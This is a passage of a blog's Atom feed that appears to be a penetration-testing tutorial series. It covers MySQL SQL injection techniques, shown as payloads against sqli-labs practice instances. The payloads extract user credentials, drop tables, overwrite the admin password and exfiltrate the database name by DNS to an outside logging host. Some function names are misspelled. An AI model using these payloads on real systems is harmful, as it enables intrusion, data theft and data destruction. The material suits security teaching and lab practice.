    <content type="html"><![CDATA[<p>In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements together. Stack-based injection is different from other injection techniques and has limitations.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%27 --- <span class="string">&#x27;</span></span><br><span class="line"><span class="string">%20 --- space</span></span><br></pre></td></tr></table></figure><p>How can you find the table fields and table names of the other party?</p><ol><li>Look for exploitable files using directory traversal vulnerabilities, such as files with a .sql extension.</li><li>Use directory&#x2F;file fuzzing tools like Dirsearch, etc., to search for .sql files.</li><li>Search for source code leakage vulnerabilities on the other party’s website; the source code may contain exploitable files.</li><li>Search for the other party’s website source code on GitHub.</li></ol><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;    //You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1   </span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;   // it&#x27;</span>s ok</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;create table aa like users;    //create a table named aa, structure like table users</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;drop table aa--+</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;update users  set password =&#x27;</span>admin@1234<span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements toget</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="MySQL Stack-Based SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTP Header SQL Injection</title>
    <link href="http://example.com/2016/11/25/SQLInjectionHttpHeader/"/>
    <id>http://example.com/2016/11/25/SQLInjectionHttpHeader/</id>
    <published>2016-11-26T02:11:31.000Z</published>
    <updated>2023-10-19T15:20:17.106Z</updated>
    
    <content type="html"><![CDATA[<p> HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potential for cross-site scripting (XSS) attacks or other forms of web application exploitation.</p><p> Example :<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs-master/Less-18/ HTTP/1.1</span><br><span class="line">Host: 192.168.1.33</span><br><span class="line">Content-Length: 38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.33</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent:1<span class="string">&#x27; and updatexml(1,concat(0x7e,(user()),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.1.33/sqli-labs-master/Less-18/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=admin&amp;passwd=admin&amp;submit=Submit   </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. Th</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="HTTP Header SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL Error-Based SQL Injection</title>
    <link href="http://example.com/2016/11/22/SQLInjectionMySQLError/"/>
    <id>http://example.com/2016/11/22/SQLInjectionMySQLError/</id>
    <published>2016-11-23T01:55:15.000Z</published>
    <updated>2023-10-19T15:20:20.371Z</updated>
    
    <content type="html"><![CDATA[<ol><li>Overview</li></ol><p>Error-Based Injection involves deliberately triggering error conditions in the database to make query results appear in error messages. This technique is particularly useful in cases where UNION-based injections are restricted and error information can be returned. It’s also known as Formulaic SQL Injection.</p><ol start="2"><li>Utilizing the updatexml() function:</li></ol><p>Payload:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1));--+</span><br></pre></td></tr></table></figure><p><code>0x7e</code>: ~<br><code>updatexml()</code>: Function used to update XML documents.<br><code>updatexml()</code> syntax: update(target_xml_document, xpath_expression, new_value)<br>XPath expressions are used to specify paths within an XML document. If the format is incorrect, an error will occur.</p><p>Subsequent steps for updatexml-based error-based injection:</p><p>(1). Modify the SQL statement for selecting the user position.<br>(2). Retrieve tables in the current database.<br>(3). Retrieve columns of a specific table.<br>(4). Continue step by step.</p><ol start="3"><li>Utilizing the extravalue() function:</li></ol><p>Payload:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extravalue(1,concat(0x7e,(select user()),0x7e)))--+</span><br></pre></td></tr></table></figure><p><code>extravalue()</code> function is similar to updatexml() and is used for querying node content in an XML document.<br>Subsequent steps for extravalue-based error-based injection are the same as for updatexml.</p><ol start="4"><li>Utilizing the floor() function:</li></ol><p>Payload:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><p>The principle utilized is the repetition of primary keys due to the repetitiveness of <code>floor(rand(0)*2)</code>, leading to an error in the group by statement.<br>The group by key principle involves looping through every row of data and saving the results in a temporary table. When reading each row’s key, if the key exists in the temporary table, it won’t update the temporary table’s data. If the key doesn’t exist, it will insert the key’s row data into the temporary table.</p><ol start="5"><li>Additional Information:</li></ol><p>These three functions are commonly used in error-based injections.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;Overview&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Error-Based Injection involves deliberately triggering error conditions in the database to make query result</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="MySQL Error-Based SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>DNS Log Blind SQL Injection</title>
    <link href="http://example.com/2016/11/18/SQLInjectionDnsLog/"/>
    <id>http://example.com/2016/11/18/SQLInjectionDnsLog/</id>
    <published>2016-11-18T15:47:59.000Z</published>
    <updated>2023-10-19T14:53:51.423Z</updated>
    
    <content type="html"><![CDATA[<p>Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you can use out-of-band channels, which means using other protocols or channels, such as HTTP requests, DNS resolution, SMB services, to exfiltrate data. <strong><em>DNS log</em></strong> blind injection can reduce the number of requests sent and achieve injection with direct feedback.</p><p><strong><em>DNS log</em></strong>: It stores domain name information on the DNS server, recording user access information for domains like <a href="http://www.xxx.com/">www.xxx.com</a>.</p><p><strong><em>Conditions for utilization</em></strong>:</p><ol><li><code>secure_file_priv</code> in mysql.ini must be empty.</li><li>If <code>secure_file_priv</code> is null, importing and exporting are not allowed.</li><li>If <code>secure_file_priv</code> is set to &#x2F;tmp, importing and exporting can only be done in the &#x2F;tmp directory.</li><li>When <code>secure_file_priv</code> is empty, there are no restrictions, and importing and exporting are allowed.</li></ol><p><strong><em>Example</em></strong>:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and load_file(concat(&#x27;\\&#x27;, (select database()), &#x27;.27epx0.ceye.io\abc&#x27;))--+&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you </summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="DNS Log Blind SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>Time-Based Blind SQL Injection</title>
    <link href="http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/"/>
    <id>http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/</id>
    <published>2016-10-29T02:31:42.000Z</published>
    <updated>2023-10-19T00:37:49.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Time-Based-Blind-SQL-Injection-Steps"><a href="#Time-Based-Blind-SQL-Injection-Steps" class="headerlink" title="Time-Based Blind SQL Injection Steps:"></a>Time-Based Blind SQL Injection Steps:</h1><ol><li>First, check if an injection vulnerability exists.</li><li>Next, determine the injection type: character-based, numeric-based, or search-based.</li><li>Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and 1=2 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and sleep(5) %23  </span><br></pre></td></tr></table></figure> Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection.</li><li>Start by obtaining the length of the database name:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)</span><br><span class="line">?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay)</span><br></pre></td></tr></table></figure>This indicates that the database name has a length of 8 characters.</li><li>Proceed to retrieve the database name character by character:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23</span><br></pre></td></tr></table></figure>These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name.</li></ol><h1 id="Example-of-Time-Based-Blind-SQL-Injection-Operation"><a href="#Example-of-Time-Based-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Time-Based Blind SQL Injection Operation:"></a>Example of Time-Based Blind SQL Injection Operation:</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1\ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23  响应的比较快,说明不是数字型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Time-Based-Blind-SQL-Injection-Steps&quot;&gt;&lt;a href=&quot;#Time-Based-Blind-SQL-Injection-Steps&quot; class=&quot;headerlink&quot; title=&quot;Time-Based Blind SQL</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="Time-Based Blind SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>Boolean Blind SQL Injection</title>
    <link href="http://example.com/2016/10/27/SQLInjectionBooleanBlind/"/>
    <id>http://example.com/2016/10/27/SQLInjectionBooleanBlind/</id>
    <published>2016-10-28T00:20:57.000Z</published>
    <updated>2023-10-19T00:29:50.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Boolean-Blind-SQL-Injection-Method"><a href="#Boolean-Blind-SQL-Injection-Method" class="headerlink" title="Boolean Blind SQL Injection Method"></a>Boolean Blind SQL Injection Method</h1><ol><li><p>First, obtain the length of the database name:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;n --+</span><br></pre></td></tr></table></figure></li><li><p>Next, retrieve the database name character by character:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr(database(),1,1))&gt;n) --+</span><br></pre></td></tr></table></figure><p>Note: To determine the character at a specific position, you can use a binary search method.<br>To obtain the second character of the database name, simply change the position in the “substr” function.</p></li><li><p>Use Burp Suite’s Intruder module to iterate through the possibilities.</p></li><li><p>Obtain the number of tables:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3</span><br></pre></td></tr></table></figure></li><li><p>Retrieve the length of the tables.<br>These steps outline a method for conducting a blind Boolean-based SQL injection to gather information about a database, such as the database name and the number of tables.</p></li></ol><h1 id="Example-of-Boolean-Blind-SQL-Injection-Operation"><a href="#Example-of-Boolean-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Boolean Blind SQL Injection Operation"></a>Example of Boolean Blind SQL Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; </span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=1 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=2 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 3 --+  correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 4 --+  error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;7 --+   correct  database name&#x27;s length &lt;=8</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;8 --+   error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;114) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;115) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 4 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 100) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 101) --+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Boolean-Blind-SQL-Injection-Method&quot;&gt;&lt;a href=&quot;#Boolean-Blind-SQL-Injection-Method&quot; class=&quot;headerlink&quot; title=&quot;Boolean Blind SQL Inject</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="Boolean Blind Sql Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>Union Sql Injection Detection Methods</title>
    <link href="http://example.com/2016/10/24/SQLInjectionUnion/"/>
    <id>http://example.com/2016/10/24/SQLInjectionUnion/</id>
    <published>2016-10-24T23:11:44.000Z</published>
    <updated>2023-10-19T00:46:23.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol><li>First, check for the existence of an SQL injection vulnerability.</li><li>Then, determine the injection type: character-based, numeric-based, or search-based.</li><li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li><li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li><li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li><li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li></ol><h1 id="Example-of-Union-Sql-Injection-Operation"><a href="#Example-of-Union-Sql-Injection-Operation" class="headerlink" title="Example of Union Sql Injection Operation"></a>Example of Union Sql Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Union-Sql-Injection-Detection-Methods&quot;&gt;&lt;a href=&quot;#Union-Sql-Injection-Detection-Methods&quot; class=&quot;headerlink&quot; title=&quot;Union Sql Injectio</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="Union Sql Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>Search-Based SQL Injection Detection</title>
    <link href="http://example.com/2016/10/23/SQLInjectionSearch-Based/"/>
    <id>http://example.com/2016/10/23/SQLInjectionSearch-Based/</id>
    <published>2016-10-23T23:57:41.000Z</published>
    <updated>2023-10-18T22:54:24.993Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Search-Based-Injection-Detection-Methods"><a href="#Search-Based-Injection-Detection-Methods" class="headerlink" title="Search-Based Injection Detection Methods:"></a>Search-Based Injection Detection Methods:</h1><ol><li><p>Input the search keyword: </p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>  If an error occurs, there’s a high probability of a vulnerability.</p></li><li><p>Input the search keyword: </p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>  If an error occurs, there’s a high probability of a vulnerability.</p></li><li><p>Input the search keyword: </p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure><p>  Observe the response.</p></li><li><p>Input the search keyword: </p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=2 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure><p>  Observe the response.</p></li></ol><h1 id="Search-Based-Injection-Detection-Statements"><a href="#Search-Based-Injection-Detection-Statements" class="headerlink" title="Search-Based Injection Detection Statements:"></a>Search-Based Injection Detection Statements:</h1>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=1--&#x27;</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Search-Based-Injection-Detection-Methods&quot;&gt;&lt;a href=&quot;#Search-Based-Injection-Detection-Methods&quot; class=&quot;headerlink&quot; title=&quot;Search-Based</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="Search-Based SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>Character-based SQL Injection</title>
    <link href="http://example.com/2016/10/20/SQLInjectionCharacter/"/>
    <id>http://example.com/2016/10/20/SQLInjectionCharacter/</id>
    <published>2016-10-21T01:55:22.000Z</published>
    <updated>2023-10-18T22:55:32.715Z</updated>
    
    <content type="html"><![CDATA[<p>Detection of character-based SQL Injection:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Detection of character-based SQL Injection:&lt;/p&gt;
&lt;figure class=&quot;highlight console&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="Character-based SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/"/>
    
    
  </entry>
  
</feed>
